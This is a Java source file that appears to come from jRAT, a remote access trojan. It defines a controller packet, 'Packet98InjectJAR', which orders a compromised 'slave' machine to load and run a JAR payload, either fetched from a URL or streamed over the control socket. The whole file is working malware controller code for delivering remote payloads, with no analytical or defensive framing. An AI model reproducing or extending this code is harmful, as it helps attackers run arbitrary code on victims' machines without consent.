package jrat.controller.packets.outgoing;

import jrat.common.io.FileIO;
import jrat.controller.Slave;
import java.io.DataOutputStream;
import java.io.File;

public class Packet98InjectJAR extends AbstractOutgoingPacket {

	private String url;
	private File file;
	private String mainClass;
	
	public Packet98InjectJAR(String url, String mainClass) {
		this.url = url;
		this.mainClass = mainClass;
	}
	
	public Packet98InjectJAR(File file, String mainClass) {
		this.file = file;
		this.mainClass = mainClass;
	}
	
	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(mainClass);
		slave.writeBoolean(file == null);
		if (file == null) {
			slave.writeLine(url);
		} else {
			new FileIO().writeFile(file, slave.getSocket(), slave.getDataOutputStream(), slave.getDataInputStream(), null, slave.getKey());
		}
	}

	@Override
	public short getPacketId() {
		return 98;
	}

}
